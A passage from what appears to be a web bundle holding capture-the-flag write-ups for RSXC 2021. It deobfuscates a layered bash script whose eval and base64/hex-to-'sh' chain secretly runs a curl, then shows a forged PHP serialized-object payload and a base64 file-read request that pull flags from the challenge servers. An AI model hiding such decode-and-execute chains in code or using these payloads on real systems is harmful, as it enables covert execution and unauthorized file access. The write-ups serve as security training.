<span class="token builtin class-name">eval</span> <span class="token string">"<span class="token variable">$N0q</span><span class="token variable">$x</span><span class="token variable">$Hc2</span><span class="token variable">$rQW</span>"</span></code>`,pu,Ws,Lm,hl,Km,s2,lu,Vn,nT=`<code class="language-bash"><span class="token comment"># 16-challenge2.sh</span>
<span class="token assign-left variable">gH4</span><span class="token operator">=</span><span class="token string">"Ed"</span><span class="token punctuation">;</span><span class="token assign-left variable">kM0</span><span class="token operator">=</span><span class="token string">"xSz"</span><span class="token punctuation">;</span><span class="token assign-left variable">c</span><span class="token operator">=</span><span class="token string">"ch"</span><span class="token punctuation">;</span><span class="token assign-left variable">L</span><span class="token operator">=</span><span class="token string">"4"</span><span class="token punctuation">;</span><span class="token assign-left variable">rQW</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">fE1</span><span class="token operator">=</span><span class="token string">"lQ"</span><span class="token punctuation">;</span><span class="token assign-left variable">s</span><span class="token operator">=</span><span class="token string">" 'Kg2cgwHIk1CI0YTZzFmYgwHIis0ZyM2Z3hUS3FzQJlXMDl0aohUZndHSJhmQEpleRJTT4VlaOJTSt5kMRRkWysGVOJTWE5kMR1mTiEWY3RWbuF2dmFGJiISY3J3ZhRiIzcmaONTUE5kMN1mT41kaNpXSq5EakR1T6VkeNJSYhdHZt5WY3ZWYkIiaZJza61kMRRkTykVbOBTW65UMFpmTwMGVPpXWE5EMZJSY3J3ZhRiIzsmeNJTVUlVMJ1mT10kaNp3aU5kMZpWTxMGVOhmViE2dydWYkIieZRkT51EVPFTRy4kMVRlWyU0VOVTWU9keJpXT0UlIhdncnFGJioXVH5ENVRkTysmeOlXV61kenRlTx0ERPNzYE5EaWRlTz0UbONTUq1kMrpmT10kaOBTUq5EbaRkT6lkeNJSYhdHZt5WY3ZWYkICVOBTU65keNRVTxsGVOxmU6llMVRlT6lkaZpXUy00aORVTxklaOlmWq5EMR1mT1UlaOJTUq50aapWTyEkeORTW65EMRpmTqpFVNpXS61kIhF2dk1mbhdnZhRiIUl1MrpXT41kaNJTSt5UNNpmTwElaO1mWE5kMjRlT4lFRONza61kMRRkTyEkeOVTTq5UMFdlTppFVPpXS61UNVpmTykEVONTVUlVMBpXTyElaNp3aU5EakpmTxUVbOhmVU9kMrpXT51ERPFTQ61EbSR0TxElaOVzYq1UMNpXT0UFVOp3Z650MRRVWxUleOpmW65EMJpmT1kFVPpXWE5EMZRlWyEleNlXTq1kMVRkTwMmeNpXRU5UNVRlWw0UbOFTV61UeJJTTwMGRPNTU65EbKpnTyUkaOpmWq5kMZ1WTykFVOpXUq5kIhF2dk1mbhdnZhRiIU5kMBpXT10EROJTRq5UMNJSY3J3ZhRiI61keNFTWiE2dydWYkIieVpXT10ERPpXWq5kIhF2dk1mbhdnZhRiIq1keJpmT31keOpXTq5UeNR0T6NmeNFTWiE2dydWYkIiejpXTiEWY3RWbuF2dmFGJiQkTy0kaOdXTU1keNpmTiEWY3RWbuF2dmFGJiomTyUlaOhXTE5keNpXTy0keNJTU61UMZJSY3J3ZhRiI6VleNVTT61keJpmTw0EROJTTq5kMZRVTykkeNBTWE5keNpXTiEWY3RWbuF2dmFGJiISY3J3ZhRiI6lleNJSYhdHZt5WY3ZWYkIiaaJSYhdHZt5WY3ZWYkISbOxmWUpVeNpmT0MmeNNTS65UbKpmW5VkMNd3YE50MRpnT0klIhdncnFGJikXTt5UejRlTz0kaOdXSEV2dBlnYv50VaJCIvh2YltTeZ1TYhdHZt5WY3ZWY7QUT9E2dydWY
' | r"</span><span class="token punctuation">;</span><span class="token assign-left variable">HxJ</span><span class="token operator">=</span><span class="token string">"s"</span><span class="token punctuation">;</span><span class="token assign-left variable">Hc2</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">f</span><span class="token operator">=</span><span class="token string">"as"</span><span class="token punctuation">;</span><span class="token assign-left variable">kcE</span><span class="token operator">=</span><span class="token string">"pas"</span><span class="token punctuation">;</span><span class="token assign-left variable">cEf</span><span class="token operator">=</span><span class="token string">"ae"</span><span class="token punctuation">;</span><span class="token assign-left variable">d</span><span class="token operator">=</span><span class="token string">"o"</span><span class="token punctuation">;</span><span class="token assign-left variable">V9z</span><span class="token operator">=</span><span class="token string">"6"</span><span class="token punctuation">;</span><span class="token assign-left variable">P8c</span><span class="token operator">=</span><span class="token string">"if"</span><span class="token punctuation">;</span><span class="token assign-left variable">U</span><span class="token operator">=</span><span class="token string">" -d"</span><span class="token punctuation">;</span><span class="token assign-left variable">Jc</span><span class="token operator">=</span><span class="token string">"ef"</span><span class="token punctuation">;</span><span class="token assign-left variable">N0q</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span><span class="token string">"b"</span><span class="token punctuation">;</span><span class="token assign-left variable">w</span><span class="token operator">=</span><span class="token string">"e"</span><span class="token punctuation">;</span><span class="token assign-left variable">b</span><span class="token operator">=</span><span class="token string">"v |"</span><span class="token punctuation">;</span><span class="token assign-left variable">Tx</span><span class="token operator">=</span><span class="token string">"Eds"</span><span class="token punctuation">;</span><span class="token assign-left variable">xZp</span><span class="token operator">=</span><span class="token string">""</span>
<span class="token assign-left variable">x</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$Hc2</span><span class="token variable">$w</span><span class="token variable">$c</span><span class="token variable">$rQW</span><span class="token variable">$d</span><span class="token variable">$s</span><span class="token variable">$w</span><span class="token variable">$b</span><span class="token variable">$Hc2</span><span class="token variable">$v</span><span class="token variable">$xZp</span><span class="token variable">$f</span><span class="token variable">$w</span><span class="token variable">$V9z</span><span class="token variable">$rQW</span><span class="token variable">$L</span><span class="token variable">$U</span><span class="token variable">$xZp</span>"</span><span class="token variable">)</span></span>
<span class="token builtin class-name">echo</span> <span class="token variable">$x</span> <span class="token operator">|</span> base64
<span class="token comment">#eval "$N0q$x$Hc2$rQW"</span></code>`,cu,uo,a2,iu,xn,eT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">bash</span> <span class="token number">16</span>-challenge2.sh <span class="token operator">|</span> base64 -d
<span class="token builtin class-name">echo</span> <span class="token string">'Kg2cgwHIk1CI0YTZzFmYgwHIis0ZyM2Z3hUS3FzQJlXMDl0aohUZndHSJhmQEpleRJTT4VlaOJTSt5kMRRkWysGVOJTWE5kMR1mTiEWY3RWbuF2dmFGJiISY3J3ZhRiIzcmaONTUE5kMN1mT41kaNpXSq5EakR1T6VkeNJSYhdHZt5WY3ZWYkIiaZJza61kMRRkTykVbOBTW65UMFpmTwMGVPpXWE5EMZJSY3J3ZhRiIzsmeNJTVUlVMJ1mT10kaNp3aU5kMZpWTxMGVOhmViE2dydWYkIieZRkT51EVPFTRy4kMVRlWyU0VOVTWU9keJpXT0UlIhdncnFGJioXVH5ENVRkTysmeOlXV61kenRlTx0ERPNzYE5EaWRlTz0UbONTUq1kMrpmT10kaOBTUq5EbaRkT6lkeNJSYhdHZt5WY3ZWYkICVOBTU65keNRVTxsGVOxmU6llMVRlT6lkaZpXUy00aORVTxklaOlmWq5EMR1mT1UlaOJTUq50aapWTyEkeORTW65EMRpmTqpFVNpXS61kIhF2dk1mbhdnZhRiIUl1MrpXT41kaNJTSt5UNNpmTwElaO1mWE5kMjRlT4lFRONza61kMRRkTyEkeOVTTq5UMFdlTppFVPpXS61UNVpmTykEVONTVUlVMBpXTyElaNp3aU5EakpmTxUVbOhmVU9kMrpXT51ERPFTQ61EbSR0TxElaOVzYq1UMNpXT0UFVOp3Z650MRRVWxUleOpmW65EMJpmT1kFVPpXWE5EMZRlWyEleNlXTq1kMVRkTwMmeNpXRU5UNVRlWw0UbOFTV61UeJJTTwMGRPNTU65EbKpnTyUkaOpmWq5kMZ1WTykFVOpXUq5kIhF2dk1mbhdnZhRiIU5kMBpXT10EROJTRq5UMNJSY3J3ZhRiI61keNFTWiE2dydWYkIieVpXT10ERPpXWq5kIhF2dk1mbhdnZhRiIq1keJpmT31keOpXTq5UeNR0T6NmeNFTWiE2dydWYkIiejpXTiEWY3RWbuF2dmFGJiQkTy0kaOdXTU1keNpmTiEWY3RWbuF2dmFGJiomTyUlaOhXTE5keNpXTy0keNJTU61UMZJSY3J3ZhRiI6VleNVTT61keJpmTw0EROJTTq5kMZRVTykkeNBTWE5keNpXTiEWY3RWbuF2dmFGJiISY3J3ZhRiI6lleNJSYhdHZt5WY3ZWYkIiaaJSYhdHZt5WY3ZWYkISbOxmWUpVeNpmT0MmeNNTS65UbKpmW5VkMNd3YE50MRpnT0klIhdncnFGJikXTt5UejRlTz0kaOdXSEV2dBlnYv50VaJCIvh2YltTeZ1TYhdHZt5WY3ZWY7QUT9E2dydWY '</span> <span class="token operator">|</span> <span class="token function">rev</span> <span class="token operator">|</span>base64 -d
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> <span class="token string">'Kg2cgwHIk1CI0YTZzFmYgwHIis0ZyM2Z3hUS3FzQJlXMDl0aohUZndHSJhmQEpleRJTT4VlaOJTSt5kMRRkWysGVOJTWE5kMR1mTiEWY3RWbuF2dmFGJiISY3J3ZhRiIzcmaONTUE5kMN1mT41kaNpXSq5EakR1T6VkeNJSYhdHZt5WY3ZWYkIiaZJza61kMRRkTykVbOBTW65UMFpmTwMGVPpXWE5EMZJSY3J3ZhRiIzsmeNJTVUlVMJ1mT10kaNp3aU5kMZpWTxMGVOhmViE2dydWYkIieZRkT51EVPFTRy4kMVRlWyU0VOVTWU9keJpXT0UlIhdncnFGJioXVH5ENVRkTysmeOlXV61kenRlTx0ERPNzYE5EaWRlTz0UbONTUq1kMrpmT10kaOBTUq5EbaRkT6lkeNJSYhdHZt5WY3ZWYkICVOBTU65keNRVTxsGVOxmU6llMVRlT6lkaZpXUy00aORVTxklaOlmWq5EMR1mT1UlaOJTUq50aapWTyEkeORTW65EMRpmTqpFVNpXS61kIhF2dk1mbhdnZhRiIUl1MrpXT41kaNJTSt5UNNpmTwElaO1mWE5kMjRlT4lFRONza61kMRRkTyEkeOVTTq5UMFdlTppFVPpXS61UNVpmTykEVONTVUlVMBpXTyElaNp3aU5EakpmTxUVbOhmVU9kMrpXT51ERPFTQ61EbSR0TxElaOVzYq1UMNpXT0UFVOp3Z650MRRVWxUleOpmW65EMJpmT1kFVPpXWE5EMZRlWyEleNlXTq1kMVRkTwMmeNpXRU5UNVRlWw0UbOFTV61UeJJTTwMGRPNTU65EbKpnTyUkaOpmWq5kMZ1WTykFVOpXUq5kIhF2dk1mbhdnZhRiIU5kMBpXT10EROJTRq5UMNJSY3J3ZhRiI61keNFTWiE2dydWYkIieVpXT10ERPpXWq5kIhF2dk1mbhdnZhRiIq1keJpmT31keOpXTq5UeNR0T6NmeNFTWiE2dydWYkIiejpXTiEWY3RWbuF2dmFGJiQkTy0kaOdXTU1keNpmTiEWY3RWbuF2dmFGJiomTyUlaOhXTE5keNpXTy0keNJTU61UMZJSY3J3ZhRiI6VleNVTT61keJpmTw0EROJTTq5kMZRVTykkeNBTWE5keNpXTiEWY3RWbuF2dmFGJiISY3J3ZhRiI6lleNJSYhdHZt5WY3ZWYkIiaaJSYhdHZt5WY3ZWYkISbOxmWUpVeNpmT0MmeNNTS65UbKpmW5VkMNd3YE50MRpnT0klIhdncnFGJikXTt5UejRlTz0kaOdXSEV2dBlnYv50VaJCIvh2YltTeZ1TYhdHZt5WY3ZWY7QUT9E2dydWY'</span> <span class="token operator">|</span> <span class="token function">rev</span> <span class="token operator">|</span>base64 -d
<span class="token assign-left variable">agrwa</span><span class="token operator">=</span>MD<span class="token punctuation">;</span><span class="token assign-left variable">afwanmdwaa</span><span class="token operator">=</span>Yy<span class="token punctuation">;</span><span class="token builtin class-name">echo</span> <span class="token string">"ZWNobyAweDIwNjM3NTcyNmMy"</span><span class="token variable">$agrwa</span><span class="token string">"Y4NzQ3NDcwM2EyZjJmNzI3Mzc4NjMyZTZlNm"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"Zj"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzYz"</span><span class="token variable">$agrwa</span><span class="token string">""</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzMzNDY0MzI2MTY2NjM2NDM0NjIzMzM5MzUz"</span><span class="token variable">$agrwa</span><span class="token string">"Y1MzQ2MzM2MzMzNDMxNjU2Nj"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"NjMzMTMwNjM2ND"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"Mzcz"</span><span class="token variable">$agrwa</span><span class="token string">"Y1MzczODMyNjMzNzMwNjIzMj"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"NjYzODM5MzUz"</span><span class="token variable">$agrwa</span><span class="token string">"Y1MzMz"</span><span class="token variable">$agrwa</span><span class="token string">"M1NjE2NDM5MzA2NT"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"NjQzNTY2MmY2NjZjNjE2NzJlNzQ3ODc0M2IyMzU1NmM0ZTU5NTEzMzc0NDU2MjMyMzQ2ZTY0NDYzOTY5NjI0NzZjNzU1YTQ3NzgzNTU4MzM1Mjc5NjQ1ODRlMzA1ODMyMzk2OTVhNmU1NjdhNTkzMjQ2MzA1YTU3NTI2NjU5MzIzOTZiNWE1NjM5NzA2NDQ2Mzk3NDYxNTc2NDZmNjQ0NjM5NmI2MjMxMzk3YT"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzIzMTZjNjQ0NzY4NzA2MjZkNjQ2NjU5NmQ0NjZiNjY1MTNkM2QzYjIzNTU2YzRlNTk1MTMzNzQ0NT"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzIzNDZlNjQ0NjM5Njk2MjQ3NmM3NTVhNDc3ODM1NTgzMzUyNzk2NDU4NGUz"</span><span class="token variable">$agrwa</span><span class="token string">"U4MzIzOTY5NWE2ZTU2N2E1OTMyNDYz"</span><span class="token variable">$agrwa</span><span class="token string">"VhNTc1MjY2NTkzMjM5NmI1YTU2Mzk3"</span><span class="token variable">$agrwa</span><span class="token string">"Y0NDYzOTc0NjE1NzY0NmY2NDQ2Mzk2Yj"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzEzOTdhNjIzMjMxNmM2NDQ3Njg3"</span><span class="token variable">$agrwa</span><span class="token string">""</span><span class="token variable">$afwanmdwaa</span><span class="token string">"NmQ2NDY2NTk2ZDQ2NmI2NjUxM2QzZDBhIHwgeHhkIC1yIC1wIHwgc2gK"</span> <span class="token operator">|</span> base64 -d <span class="token operator">|</span> <span class="token function">sh</span></code>`,ru,P,n2,dl,e2,t2,ml,o2,p2,uu,Un,tT=`<code class="language-bash"><span class="token comment"># 16-challenge3.sh</span>
<span class="token assign-left variable">agrwa</span><span class="token operator">=</span>MD<span class="token punctuation">;</span><span class="token assign-left variable">afwanmdwaa</span><span class="token operator">=</span>Yy<span class="token punctuation">;</span><span class="token builtin class-name">echo</span> <span class="token string">"ZWNobyAweDIwNjM3NTcyNmMy"</span><span class="token variable">$agrwa</span><span class="token string">"Y4NzQ3NDcwM2EyZjJmNzI3Mzc4NjMyZTZlNm"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"Zj"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzYz"</span><span class="token variable">$agrwa</span><span class="token string">""</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzMzNDY0MzI2MTY2NjM2NDM0NjIzMzM5MzUz"</span><span class="token variable">$agrwa</span><span class="token string">"Y1MzQ2MzM2MzMzNDMxNjU2Nj"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"NjMzMTMwNjM2ND"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"Mzcz"</span><span class="token variable">$agrwa</span><span class="token string">"Y1MzczODMyNjMzNzMwNjIzMj"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"NjYzODM5MzUz"</span><span class="token variable">$agrwa</span><span class="token string">"Y1MzMz"</span><span class="token variable">$agrwa</span><span class="token string">"M1NjE2NDM5MzA2NT"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"NjQzNTY2MmY2NjZjNjE2NzJlNzQ3ODc0M2IyMzU1NmM0ZTU5NTEzMzc0NDU2MjMyMzQ2ZTY0NDYzOTY5NjI0NzZjNzU1YTQ3NzgzNTU4MzM1Mjc5NjQ1ODRlMzA1ODMyMzk2OTVhNmU1NjdhNTkzMjQ2MzA1YTU3NTI2NjU5MzIzOTZiNWE1NjM5NzA2NDQ2Mzk3NDYxNTc2NDZmNjQ0NjM5NmI2MjMxMzk3YT"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzIzMTZjNjQ0NzY4NzA2MjZkNjQ2NjU5NmQ0NjZiNjY1MTNkM2QzYjIzNTU2YzRlNTk1MTMzNzQ0NT"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzIzNDZlNjQ0NjM5Njk2MjQ3NmM3NTVhNDc3ODM1NTgzMzUyNzk2NDU4NGUz"</span><span class="token variable">$agrwa</span><span class="token string">"U4MzIzOTY5NWE2ZTU2N2E1OTMyNDYz"</span><span class="token variable">$agrwa</span><span class="token string">"VhNTc1MjY2NTkzMjM5NmI1YTU2Mzk3"</span><span class="token variable">$agrwa</span><span class="token string">"Y0NDYzOTc0NjE1NzY0NmY2NDQ2Mzk2Yj"</span><span class="token variable">$afwanmdwaa</span><span class="token string">"MzEzOTdhNjIzMjMxNmM2NDQ3Njg3"</span><span class="token variable">$agrwa</span><span class="token string">""</span><span class="token variable">$afwanmdwaa</span><span class="token string">"NmQ2NDY2NTk2ZDQ2NmI2NjUxM2QzZDBhIHwgeHhkIC1yIC1wIHwgc2gK"</span> <span class="token operator">|</span> base64 -d</code>`,ku,N,l2,bl,c2,i2,gl,r2,u2,vl,k2,f2,fu,Rn,oT=`<code class="language-bash">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">bash</span> <span class="token number">16</span>-challenge3.sh
<span class="token builtin class-name">echo</span> 0x206375726c20687474703a2f2f727378632e6e6f2f623630623334643261666364346233393530653463363334316566626331306364623730653738326337306232626638393530653330356164393065626435662f666c61672e7478743b23556c4e59513374456232346e6446396962476c755a4778355833527964584e30583239695a6e567a593246305a5752665932396b5a563970644639746157646f6446396b6231397a6232316c64476870626d6466596d466b66513d3d3b23556c4e59513374456232346e6446396962476c755a4778355833527964584e30583239695a6e567a593246305a5752665932396b5a563970644639746157646f6446396b6231397a6232316c64476870626d6466596d466b66513d3d0a <span class="token operator">|</span> xxd -r -p <span class="token operator">|</span> <span class="token function">sh</span>
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> 0x206375726c20687474703a2f2f727378632e6e6f2f623630623334643261666364346233393530653463363334316566626331306364623730653738326337306232626638393530653330356164393065626435662f666c61672e7478743b23556c4e59513374456232346e6446396962476c755a4778355833527964584e30583239695a6e567a593246305a5752665932396b5a563970644639746157646f6446396b6231397a6232316c64476870626d6466596d466b66513d3d3b23556c4e59513374456232346e6446396962476c755a4778355833527964584e30583239695a6e567a593246305a5752665932396b5a563970644639746157646f6446396b6231397a6232316c64476870626d6466596d466b66513d3d0a <span class="token operator">|</span> xxd -r -p
 <span class="token function">curl</span> http://rsxc.no/b60b34d2afcd4b3950e4c6341efbc10cdb70e782c70b2bf8950e305ad90ebd5f/flag.txt<span class="token punctuation">;</span><span class="token comment">#UlNYQ3tEb24ndF9ibGluZGx5X3RydXN0X29iZnVzY2F0ZWRfY29kZV9pdF9taWdodF9kb19zb21ldGhpbmdfYmFkfQ==;#UlNYQ3tEb24ndF9ibGluZGx5X3RydXN0X29iZnVzY2F0ZWRfY29kZV9pdF9taWdodF9kb19zb21ldGhpbmdfYmFkfQ==</span></code>`,hu,ko,h2,du,Nn,pT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> <span class="token assign-left variable">UlNYQ3tEb24ndF9ibGluZGx5X3RydXN0X29iZnVzY2F0ZWRfY29kZV9pdF9taWdodF9kb19zb21ldGhpbmdfYmFkfQ</span><span class="token operator">==</span> <span class="token operator">|</span> base64 -d
RSXC<span class="token punctuation">&#123;</span>Don't_blindly_trust_obfuscated_code_it_might_do_something_bad<span class="token punctuation">&#125;</span></code>`,mu,Wn,d2,_l,m2,bu,Sn,fo,b2,gu,Mn,ho,g2,vu,mo,bo,v2,ks,_2,_u,In,go,w2,wu,m,E2,wl,T2,y2,El,V2,x2,Tl,U2,R2,yl,N2,W2,Vl,S2,M2,xl,I2,O2,Ul,F2,z2,Rl,C2,D2,Eu,On,lT=`<code class="language-php"><span class="token comment">// index.php</span>
file <span class="token operator">=</span> <span class="token constant">__DIR__</span><span class="token operator">.</span> <span class="token string double-quoted-string">"/files/"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">realpath</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token constant">__DIR__</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">__DIR__</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Finding your card in /files"</span><span class="token punctuation">)</span> <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"NO \xF0\u0178\u02DC "</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'card'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'card'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token variable">$card</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'card'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token variable">$card</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Card</span><span class="token punctuation">;</span> <span class="token variable">$card</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'files/card.txt'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$card</span><span class="token operator">-></span><span class="token function">displayCard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code>`,Tu,W,Y2,Nl,Z2,J2,Wl,j2,P2,Sl,H2,A2,yu,Fn,cT=`<code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Card</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">private</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
	<span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Card</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// Tzo0OiJDYXJkIjoxOntzOjEwOiIAQ2FyZABmaWxlIjtzOjg6ImZsYWcudHh0Ijt9</span>
<span class="token delimiter important">?></span></span></code>`,Vu,zn,iT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> http://rsxc.no:20017/?card<span class="token operator">=</span>Tzo0OiJDYXJkIjoxOntzOjEwOiIAQ2FyZABmaWxlIjtzOjg6ImZsYWcudHh0Ijt9
Finding your card <span class="token keyword">in</span> /files
RSXC<span class="token punctuation">&#123;</span>Care_needs_to_be_taken_with_user_supplied_input.It_should_never_be_trusted<span class="token punctuation">&#125;</span></code>`,xu,Cn,X2,Ml,G2,Uu,Dn,vo,q2,Ru,Yn,_o,B2,Nu,wo,Eo,$2,fs,Q2,Wu,Zn,To,L2,Su,Ss,K2,Il,s1,a1,Mu,Jn,rT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">unzip</span> <span class="token number">18</span>-challenge.zip
Archive:  <span class="token number">18</span>-challenge.zip
  inflating: Dockerfile
  inflating: docker-box.tar.gz
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">tar</span> -xzf docker-box.tar.gz
juki@izone:~/Desktop/ctf/rsxc2021$ strings docker-box.tar <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"RSXC"</span>
RSXC<span class="token punctuation">&#123;</span>Now_you_know_that_docker_images_are_like_onions.They_have_many_layers<span class="token punctuation">&#125;</span></code>`,Iu,jn,n1,Ol,e1,Ou,Pn,yo,t1,Fu,Hn,Vo,o1,zu,xo,Uo,p1,hs,l1,Cu,An,Ro,c1,Du,g,i1,Fl,r1,u1,zl,k1,f1,Cl,h1,d1,Dl,m1,b1,Yl,g1,v1,Zl,_1,w1,Yu,E,E1,Jl,T1,y1,jl,V1,x1,Pl,U1,R1,Hl,N1,W1,Al,S1,M1,Zu,Xn,uT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> <span class="token assign-left variable">dHJlZS50eHQ</span><span class="token operator">=</span> <span class="token operator">|</span> base64 -d
tree.txt</code>`,Ju,H,I1,Xl,O1,F1,Gl,z1,C1,ju,Gn,kT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> -s http://rsxc.no:20019/card.php?card<span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> -n <span class="token string">"flag.txt"</span> <span class="token operator">|</span> base64<span class="token variable">)</span></span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"RSXC"</span>
RSXC<span class="token punctuation">&#123;</span>It_is_not_smart_to_let_people_include_whatever_they_want<span class="token punctuation">&#125;</span></code>`,Pu,qn,D1,ql,Y1,Hu,Bn,No,Z1,Au,$n,Wo,J1,Xu,So,Mo,j1,ds,P1,Gu,Qn,Io,H1,qu,Oo,A1,Bu,Ln,fT=`<code class="language-php">This is the code found in /api.php
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hmac'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"HTTP/1.0 400 Bad Request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SECRET"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

